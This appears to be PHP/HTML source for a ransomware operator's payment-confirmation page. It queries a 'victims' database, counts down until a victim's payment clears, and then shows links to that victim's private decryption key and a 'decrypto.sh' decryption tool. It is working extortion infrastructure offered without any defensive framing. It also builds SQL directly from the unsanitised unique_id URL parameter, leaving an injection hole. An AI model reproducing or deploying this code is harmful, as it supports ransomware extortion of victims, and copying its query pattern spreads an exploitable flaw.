<html>
  <head>
    <title>
      Payment Confirmation
    </title>
    <script src="/scripts/jquery.js"></script>
  </head>
<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$timestamp = time();
$dateTimestamp = new DateTime("@$timestamp");

$timestamp = $dateTimestamp->format('Y-m-d H:i:s');

if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
   $uniqueID = $_GET['unique_id'];
   $sql = "SELECT timediff(paid_count, \"$timestamp\") as time_left from target_list where unique_id = \"$uniqueID\"";
   $result = $conn->query($sql);

   if ($result->num_rows > 0) {
      while ($row = $result->fetch_assoc()) {
         if ($row['time_left'] < "00:00:01") {
            echo "<script>" . "\n";
            echo "   $(document).ready(function() {" . "\n";
            echo "      $('#title').hide();" . "\n";
            echo "      $('#new_title').append(\"<center><font color=\'green\'><h3>Download Links</h3></font></center>\");" . "\n";
            echo "      $('#show_timer').append(\"<center><a href=\'https://" .  $_SERVER['SERVER_NAME'] . "/downloads/" . $uniqueID . "_priv.pem\'>Private Key Download</a></center><br /><br /><center><a href=\'https://" .  $_SERVER['SERVER_NAME'] . "/downloads/decrypto.sh\'>Decryption Software Download</a></center>\");" . "\n";
            echo "   });" . "\n";
            echo "</script>" . "\n";
         } else {
            echo "<script>" . "\n";
            echo "   $(document).ready(function() {" . "\n";
            echo "     setInterval(function() {" . "\n";
            echo "       $.get(\"time_query.php?unique_id=$uniqueID\", function (result) {" . "\n";
            echo "         $('#show_timer').html(result);" . "\n";
            echo "       });" . "\n";
            echo "     }, 1000);" . "\n";
            echo "   });" . "\n";
            echo "</script>" . "\n";
         }
      }
   }
}

$conn->close();

?>
  <body bgcolor="lightblue">
    <center>
      <table style="padding-left: 1em; padding-right: 1em; background: white;border-radius:10px;-moz-border-radius:10px;-webkit-border-radius:10px;">
        <tr>
          <td>
            <h1>
              <font color="green">
                <div id="title">
                  Time Remaining Until Decryption Possible:
                </div>
                <div id="new_title"></div>
                <br /><br />
              </font>
            </h1>
          </td>
        </tr>
        <tr>
          <td>
            <div id="show_timer" name="show_timer"></div>
          </td>
        </tr>
      </table>
    </center>
  </body>
</html>
  
